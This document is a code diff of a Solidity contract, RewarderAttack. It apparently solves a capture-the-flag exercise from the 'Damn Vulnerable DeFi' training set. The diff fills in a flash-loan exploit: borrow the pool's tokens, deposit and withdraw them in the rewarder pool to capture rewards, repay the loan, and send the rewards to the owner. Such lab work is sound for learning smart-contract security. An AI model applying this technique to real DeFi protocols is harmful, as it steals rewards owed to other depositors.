@@ -35,14 +35,22 @@ contract RewarderAttack {
     }
 
     function requestFlashLoan() external {
+        require(msg.sender == owner, "Only owner allowed");
         uint256 poolBalance = damnValuableToken.balanceOf(address(flashLoanerPool));
         flashLoanerPool.flashLoan(poolBalance);
     }
 
 
     function receiveFlashLoan(uint256 amount) external {
-        // code exploit here
+        require(msg.sender == address(flashLoanerPool), "Only pool allowed");
+
+        damnValuableToken.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(amount);
         damnValuableToken.transfer(address(flashLoanerPool), amount);
+
+        uint256 rewardsBalance = rewardToken.balanceOf(address(this));
+        require(rewardToken.transfer(owner, rewardsBalance), "Rewards Withdrawal to Owner Failed");
 
     }
 
